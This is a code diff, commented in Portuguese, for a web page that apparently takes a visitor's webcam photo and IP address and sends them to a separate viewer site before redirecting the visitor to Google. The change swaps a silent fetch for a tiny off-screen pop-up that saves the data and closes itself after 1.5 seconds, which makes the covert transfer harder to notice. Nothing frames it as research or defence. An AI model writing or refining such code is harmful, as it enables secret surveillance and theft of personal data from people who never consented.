@@ -72,18 +72,25 @@
                 const finalURL = VIEW_SITE_URL + 
                                  `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
                 
-                // Envia uma requisição silenciosa (fetch) para a URL de visualização.
-                // Isso força o navegador do usuário a carregar e salvar a foto no LocalStorage,
-                // antes que ele seja redirecionado para o Google.
-                fetch(finalURL)
-                    .then(() => { /* Sucesso */ })
-                    .catch(() => { /* Ignora erro de rede/CORS se for o caso */ })
-                    .finally(() => {
-                        // Redireciona o usuário para o Google
-                        window.location.href = REDIRECT_URL;
-                    });
+                // 🚨 MUDANÇA CRÍTICA: Abre uma nova aba (que vai salvar o dado)
+                // Usamos _blank, mas com dimensões pequenas para ser menos intrusivo.
+                const newWindow = window.open(finalURL, '_blank', 'width=10,height=10,left=9999');
+
+                // Espera 1.5 segundos (para dar tempo do SiteViewFoto carregar e salvar)
+                setTimeout(() => {
+                    if (newWindow) {
+                        try {
+                           newWindow.close(); // Tenta fechar a aba que fez o salvamento
+                        } catch (e) {
+                           console.log("A janela de salvamento não pôde ser fechada automaticamente.");
+                        }
+                    }
+                    // Redireciona o usuário para o Google
+                    window.location.href = REDIRECT_URL;
+                }, 1500); 
+                
             } else {
-                 // Se não houve foto, redireciona diretamente para o Google
+                 // Se não houve foto (falha na webcam), redireciona diretamente para o Google
                  window.location.href = REDIRECT_URL;
             }
         }
